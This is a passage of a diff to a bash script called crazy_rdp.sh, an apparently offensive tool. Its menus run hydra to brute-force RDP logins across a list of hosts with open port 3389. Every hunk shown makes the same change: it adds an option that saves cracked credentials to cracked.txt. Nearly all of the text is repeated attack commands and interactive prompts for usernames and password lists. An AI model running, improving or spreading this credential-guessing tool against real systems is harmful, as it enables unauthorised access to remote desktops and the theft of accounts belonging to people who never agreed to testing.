-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -4758,7 +4758,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -4802,7 +4802,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -4812,7 +4812,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -4822,7 +4822,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -4831,7 +4831,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -4875,7 +4875,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -4885,7 +4885,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -4895,7 +4895,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -4904,7 +4904,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -4948,7 +4948,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -4958,7 +4958,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -4968,7 +4968,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -4977,7 +4977,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -5020,7 +5020,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -5030,7 +5030,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -5040,7 +5040,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -5049,7 +5049,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -5093,7 +5093,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -5103,7 +5103,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -5113,7 +5113,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -5122,7 +5122,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -5166,7 +5166,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -5176,7 +5176,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -5186,7 +5186,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -5195,7 +5195,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -5239,7 +5239,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -5249,7 +5249,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -5259,7 +5259,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -5268,7 +5268,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -5312,7 +5312,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -5322,7 +5322,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -5332,7 +5332,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -5341,7 +5341,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -5385,7 +5385,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -5395,7 +5395,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -5405,7 +5405,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -5414,7 +5414,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -5458,7 +5458,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -5468,7 +5468,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -5478,7 +5478,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -5487,7 +5487,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -5531,7 +5531,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -5541,7 +5541,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -5551,7 +5551,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -5560,7 +5560,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -5604,7 +5604,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -5614,7 +5614,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -5624,7 +5624,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -5633,7 +5633,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -5677,7 +5677,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -5687,7 +5687,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -5697,7 +5697,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -5706,7 +5706,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -5750,7 +5750,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -5760,7 +5760,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -5770,7 +5770,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -5779,7 +5779,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -5823,7 +5823,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -5833,7 +5833,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -5843,7 +5843,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -5852,7 +5852,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -5896,7 +5896,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -5906,7 +5906,7 @@ fi
 if [ $brutmenu = "2" ]; then
